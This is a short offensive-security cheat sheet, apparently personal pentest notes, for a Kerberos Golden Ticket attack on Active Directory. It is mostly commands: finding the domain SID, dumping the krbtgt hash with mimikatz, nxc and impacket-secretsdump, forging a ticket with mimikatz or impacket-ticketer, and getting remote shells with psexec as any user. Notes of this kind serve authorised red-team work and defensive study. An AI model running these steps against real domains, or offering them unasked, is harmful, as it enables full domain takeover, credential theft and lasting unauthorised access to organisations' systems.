---
tags:
  - Authenticated
  - Kerberos
  - Persistence
  - AD
---
forge a Kerberos Ticket Granting Ticket (TGT) with a domain's KRBTGT account hash, allowing an attacker to impersonate any user including domain admins without needing their credentials.

#### **Get domain SID**
locally:
```powershell
(Get-ADDomain).DomainSID
```
```batch
whoami /user # (domain SID is the part before the last hyphen (RID).)
```
remotely:
```
nxc ldap <target> -u <user> -p <pass> --sid
```
#### **Get krbtgt account hash**
locally - mimikatz
```bash
lsadump::lsa /inject /name:krbtgt
```
remotely - nxc
```bash
nxc smb >ip> --local-auth -u '' -p '' --lsa --user krbtgt
nxc smb <dcip> --local-auth -u '' -p '' --ntds --user krbtgt
```
remotely - secretsdump
```bash
impacket-secretsdump user:pass@10.0.0.35
```
#### **Generate ticket**
**with mimikatz**
```
kerberos::golden /User:Administrator /domain:domain.local /sid:<SID> /krbtgt:<krbtgt hash> /id:500 /ptt
```
spawn shell with ticket
```powershell
misc::cmd
```
Now we can use psexec for a shell anywhere
```powershell
psexec.exe  -accepteula \\hostname cmd.exe
```
**With impacket**
```bash
impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# OR with aes
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
```
set ticket env var
```
export KRB5CCNAME=<TGS_ccache_file>
```
Then you can access anything
```bash
impacket-psexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
